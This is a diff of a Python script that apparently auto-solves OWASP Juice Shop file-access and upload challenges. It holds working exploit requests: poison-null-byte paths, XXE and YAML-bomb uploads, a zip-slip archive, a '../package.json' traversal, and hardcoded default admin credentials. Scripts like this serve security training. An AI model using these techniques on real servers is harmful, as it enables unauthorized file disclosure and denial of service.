@@ -1,103 +1,116 @@
+#!/usr/bin/env python3
+"""File-access & file-upload challenges: FTP poison-null-byte, hidden URLs,
+XXE / YAML-bomb / zip-slip uploads, local file read."""
+from __future__ import annotations
+
+import datetime
 import os
 
-from authentication import get_admin_session
+from core import register_solver, Client, ok, warn, fail
 
-def print_response(res):
-    print('HTTP/1.1 {status_code}\n{headers}\n\n{body}'.format(
-        status_code=res.status_code,
-        headers='\n'.join('{}: {}'.format(k, v) for k, v in res.headers.items()),
-        body=res.content,
-    ))
-
-def get_ftp_file_list(server, session):
-    """
-    Fetch list of files from http://{server}/ftp
-    :param server: juice shop URL
-    :param session: Requests session
-    :return: JSON response containing file list
-    """
-    files = session.get('{}/ftp'.format(server), headers={'Accept': 'application/json'})
-    if not files.ok:
-        raise RuntimeError('Error retrieving file list.')
-    return files.json()
+PAYLOADS = os.path.join(os.path.dirname(__file__), "payloads")
 
 
-def download_files_from_ftp(server, session, files=None):
-    """
-    Save files from the JS /ftp directory locally.
-    :param server: juice shop URL
-    :param session: Session
-    :param files: list of filenames. If None provided, all files will be retrieved.
-    """
-    if files is None:
-        files = get_ftp_file_list(server, session)
-    for item in files:
-        resp = download_file_from_ftp(server, session, item)
-        _write_file_to_disk(item, resp)
+def _payload(name: str) -> bytes:
+    with open(os.path.join(PAYLOADS, name), "rb") as f:
+        return f.read()
 
 
-def get_easter_egg_content(server, session):
-    """
-    Fetch contents of eastere.gg for another challenge...
-    :param server: juice shop URL
-    :param session: Session
-    :return: eastere.gg contents as string
-    """
-    return download_file_from_ftp(server, session, 'eastere.gg').content
+# ---- FTP poison null byte (%2500 -> %00) ---------------------------------- #
+_FTP = {
+    "forgottenBackupChallenge":       ("Sensitive Data Exposure", "/ftp/coupons_2013.md.bak%2500.md"),
+    "forgottenDevBackupChallenge":    ("Sensitive Data Exposure", "/ftp/package.json.bak%2500.md"),
+    "easterEggLevelOneChallenge":     ("Broken Access Control", "/ftp/eastere.gg%2500.md"),
+    "misplacedSignatureFileChallenge": ("Observability Failures", "/ftp/suspicious_errors.yml%2500.md"),
+    "nullByteChallenge":              ("Improper Input Validation", "/ftp/encrypt.pyc%2500.md"),
+}
 
 
-def download_file_from_ftp(server, session, filename):
-    """
-    Use null-byte injection to bypass the server filtering and download the file
-    :param server: juice shop URL
-    :param session: Requests session
-    :param filename: target filename
-    :return: Response
-    """
-    location = '{}/ftp/{}%2500.md'.format(server, filename)
-    fetch = session.get(location)
-    if not fetch.ok:
-        raise RuntimeError('Error retrieving FTP files.')
-    return fetch
+def _make_ftp(path):
+    def solver(c: Client):
+        # send the raw path so %2500 reaches the server intact
+        r = c.s.get(c.base + path, timeout=30, verify=False, headers=c._auth_headers())
+        ok(f"accessed {path} ({r.status_code})")
+    return solver
 
 
-def _write_file_to_disk(filename, response):
-    """
-    Write file to local folder
-    :param filename: filename to save.
-    :param response: Response containing the file content
-    """
-    downloadir = 'ftpfiles'
-    if not os.path.exists(downloadir):
-        os.mkdir(downloadir)
-    fileloc = os.path.join(os.getcwd(), downloadir, filename)
-    with open(fileloc, 'wb') as outfile:
-        outfile.write(response.content)
-        print('Downloaded {} to {}.'.format(response.url, fileloc))
+for _k, (_cat, _p) in _FTP.items():
+    register_solver(_k, f"Null-byte access {_p.split('/')[-1]}", _cat)(_make_ftp(_p))
 
 
-def solve_file_upload_challenges(server, session):
-    """
-    Create a junk file 150kb in size, upload it without a file extension, delete file when done
-    :param server: juice shop URL
-    :param session: Session
-    """
-    filename = 'trash.txt'
-    with open(filename, 'wb') as outfile:
-        outfile.truncate(1024 * 150)
-    with open(filename, 'rb') as infile:
-        files = {'file': ('whatever', infile, 'application/json')}
-        print('Uploading 150kb file without a file extension...'),
-        upload = session.post('{}/file-upload'.format(server), files=files)
-        if not upload.ok:
-            raise RuntimeError('Error uploading file.')
-        print('Success.')
-    os.remove(filename)
+# ---- directly-accessible hidden URLs -------------------------------------- #
+_DIRECT = {
+    "easterEggLevelTwoChallenge": ("Cryptographic Issues",
+        "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg"),
+    "premiumPaywallChallenge": ("Cryptographic Issues",
+        "/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us"),
+    "privacyPolicyProofChallenge": ("Security through Obscurity",
+        "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility"),
+    "extraLanguageChallenge": ("Broken Anti Automation", "/assets/i18n/tlh_AA.json"),
+    "missingEncodingChallenge": ("Improper Input Validation",
+        "/assets/public/images/uploads/%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"),
+}
 
 
-def solve_file_handling_challenges(server):
-    print('\n== FILE HANDLING CHALLENGES ==\n')
-    session = get_admin_session(server)
-    download_files_from_ftp(server, session)
-    solve_file_upload_challenges(server, session)
-    print('\n== FILE HANDLING CHALLENGES COMPLETE ==\n')
+def _make_direct(path):
+    def solver(c: Client):
+        r = c.s.get(c.base + path, timeout=30, verify=False)
+        ok(f"accessed {path[:60]}... ({r.status_code})")
+    return solver
+
+
+for _k, (_cat, _p) in _DIRECT.items():
+    register_solver(_k, f"Access {_p.split('/')[-1][:24]}", _cat)(_make_direct(_p))
+
+
+@register_solver("accessLogDisclosureChallenge", "Access today's access log", "Observability Failures")
+def access_log(c: Client):
+    today = datetime.date.today().isoformat()
+    r = c.get(f"/support/logs/access.log.{today}")
+    ok(f"read access.log.{today} ({r.status_code})") if r.ok \
+        else warn(f"access log for {today} returned {r.status_code}")
+
+
+# ---- file-upload driven challenges ---------------------------------------- #
+def _upload(c: Client, filename, content, content_type):
+    c.login("admin@juice-sh.op", "admin123")
+    return c.post("/file-upload", files={"file": (filename, content, content_type)},
+                  data={"UserId": "1"})
+
+
+@register_solver("deprecatedInterfaceChallenge", "Upload XML (deprecated interface)", "Security Misconfiguration")
+def deprecated_interface(c: Client):
+    r = _upload(c, "deprecatedTypeForServer.xml", _payload("deprecatedTypeForServer.xml"), "application/xml")
+    ok(f"uploaded XML complaint ({r.status_code})")
+
+
+@register_solver("xxeFileDisclosureChallenge", "XXE file disclosure (/etc/passwd)", "XXE")
+def xxe_disclosure(c: Client):
+    r = _upload(c, "xxeForLinux.xml", _payload("xxeForLinux.xml"), "application/xml")
+    ok(f"uploaded XXE payload ({r.status_code})")
+
+
+@register_solver("xxeDosChallenge", "XXE DoS (/dev/random)", "XXE")
+def xxe_dos(c: Client):
+    r = _upload(c, "xxeDevRandom.xml", _payload("xxeDevRandom.xml"), "application/xml")
+    ok(f"uploaded XXE DoS payload ({r.status_code})")
+
+
+@register_solver("yamlBombChallenge", "YAML bomb (billion laughs)", "Insecure Deserialization")
+def yaml_bomb(c: Client):
+    r = _upload(c, "yamlBomb.yml", _payload("yamlBomb.yml"), "application/x-yaml")
+    ok(f"uploaded YAML bomb ({r.status_code})")
+
+
+@register_solver("fileWriteChallenge", "Arbitrary file write (zip slip)", "Vulnerable Components")
+def file_write(c: Client):
+    r = _upload(c, "arbitraryFileWrite.zip", _payload("arbitraryFileWrite.zip"), "application/zip")
+    ok(f"uploaded zip-slip archive ({r.status_code})")
+
+
+@register_solver("lfrChallenge", "Local file read via layout param", "Vulnerable Components")
+def lfr(c: Client):
+    c.login("admin@juice-sh.op", "admin123")
+    r = c.post("/dataerasure", data="layout=../package.json",
+               headers={"Content-Type": "application/x-www-form-urlencoded"})
+    ok(f"local file read via layout traversal ({r.status_code})")
